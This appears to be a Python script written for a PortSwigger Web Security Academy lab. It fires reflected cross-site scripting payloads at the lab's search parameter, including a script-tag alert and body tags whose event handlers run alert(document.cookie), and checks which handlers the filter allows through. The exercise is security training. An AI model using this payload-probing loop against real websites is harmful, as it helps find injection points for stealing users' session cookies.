from bs4 import BeautifulSoup
import requests as s

site = 'ace41fd01e4ff0c480e6883600ae00ab.web-security-academy.net'

search_term = '''<script>alert(1)</script>'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)
if resp.status_code == 200:
    print(f'\nSuccess: {search_url} gives {resp.status_code}')
else:
    print(f'\nError: {search_url} gives {resp.status_code}: {resp.text}')

odin_id = 'semchuk2'
search_term = f'''<body>{odin_id}</body>'''
search_url = f'https://{site}/?search={search_term}'

attributes = ['onload','onunload','onerror','onmessage','onpagehide','onpageshow','onresize','onstorage']
for attribute in attributes:
    search_term = f'''<body {attribute}=alert(document.cookie)></body>'''
    search_url = f'https://{site}/?search={search_term}'
    resp = s.get(search_url)
    if resp.status_code == 200:
        print(f'Success: {search_term} gives code {resp.status_code}')
    else:
        print(f'Error: {search_term} gives response: {resp.text}')